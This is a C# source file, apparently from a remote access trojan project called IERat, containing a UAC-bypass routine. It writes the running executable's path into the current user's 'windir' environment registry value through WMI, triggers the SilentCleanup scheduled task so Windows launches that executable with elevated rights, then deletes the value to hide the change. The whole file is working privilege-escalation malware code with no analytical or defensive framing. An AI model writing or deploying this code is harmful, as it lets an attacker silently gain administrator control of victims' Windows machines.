using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Management;
using System.Threading;

namespace IERat.lib.Actions
{
    class Uac_tm
    {
        public static bool Start()
        {
            try
            {
                ConnectionOptions connectionOptions = new ConnectionOptions
                {
                    EnablePrivileges = true,
                    Impersonation = ImpersonationLevel.Impersonate
                };
                ManagementScope managementScope = new ManagementScope("\\\\" + Environment.MachineName.ToUpper() + "\\root\\CIMV2", connectionOptions);
                managementScope.Connect();
                ManagementPath managementPath = new ManagementPath("StdRegProv");
                ManagementClass managementClass = new ManagementClass(managementScope, managementPath, null);
                ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("SetStringValue");
                managementBaseObject["hDefKey"] = 0x80000001;
                managementBaseObject["sSubKeyName"] = @"Environment";
                managementBaseObject["sValueName"] = "windir";
                managementBaseObject["sValue"] = Process.GetCurrentProcess().MainModule.FileName + " &&";
                managementClass.InvokeMethod("SetStringValue", managementBaseObject, null);

                Thread.Sleep(5000);

                Process cmdProcess = new Process
                {
                    StartInfo = new ProcessStartInfo("cmd.exe")
                };
                cmdProcess.StartInfo.UseShellExecute = false;
                cmdProcess.StartInfo.CreateNoWindow = true;
                cmdProcess.StartInfo.RedirectStandardOutput = false;
                cmdProcess.StartInfo.Arguments = $"/c C:\\windows\\system32\\schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                cmdProcess.Start();

                Thread.Sleep(5000);

                RegistryKey key = Registry.CurrentUser.OpenSubKey("Environment", true);
                key.DeleteValue("windir");
                return true;
            }

            catch  { return false;  }
        }
    }
}
